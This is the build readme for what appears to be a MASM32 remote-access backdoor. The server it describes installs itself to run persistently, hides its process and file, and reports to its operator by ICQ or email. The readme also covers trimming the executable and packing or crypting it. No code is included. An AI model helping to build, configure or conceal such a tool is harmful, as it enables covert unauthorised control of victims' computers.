Tools you need installed:

* MASM32 v5+ package

To create the client or the server, you must first set some EQUates in the
source code of both the client and the server. Set PORT to the port you want
the server be listening, in both sources. If you want the server warn you about
it be ready and working, then, in server source, set ICQ or MAIL, and set UIN
if you setted ICQ, or MAILTO and SMTP if you setted the MAIL option.

Set the option NO_INSTALL if you prefer that the server dont install itself in
the system to always be executed, neither hide his process and file. Use the
VERSION option to enter the identifier for your build of the program.

Run MAKE in both directories, and collect the resulting .EXE files. Cut the 
zeroïs area in the end of the server file using a hexedit tool. The client file
cant be packed/crypted without problem, unless you mantain the compiled MZ and 
PE header unmodificated.
